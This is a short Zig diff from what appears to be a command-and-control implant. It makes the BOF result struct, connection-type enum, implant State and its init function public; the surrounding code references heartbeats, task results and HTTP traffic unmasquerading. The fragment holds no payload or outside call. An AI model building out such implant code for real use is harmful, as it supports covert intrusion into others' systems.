@@ -44,7 +44,7 @@ const PendingBof = struct {
     launcher_error_code: i32 = 0,
 };
 
-const BofRes = extern struct {
+pub const BofRes = extern struct {
     status_code: i32 = 0,
     output: ?[*]const u8 = null,
     len: u32 = 0,
@@ -55,7 +55,7 @@ const BofRes = extern struct {
 // ----------------------------------------------------------------------------
 //
 // BOF-specific error codes
-const netConnectionType = enum(u8) {
+pub const netConnectionType = enum(u8) {
     Heartbeat,
     ResourceFetch,
     TaskResult,
@@ -382,7 +382,7 @@ fn netHttpUnmasquerade(s: *State, connectionType: netConnectionType, pkt_data: ?
 // ----------------------------------------------------------------------------
 //
 
-const State = struct {
+pub const State = struct {
     const Self = @This();
 
     allocator: std.mem.Allocator,
@@ -417,7 +417,7 @@ const State = struct {
         return implant_id;
     }
 
-    fn init(allocator: std.mem.Allocator) !State {
+    pub fn init(allocator: std.mem.Allocator) !State {
         const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
         const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');
 
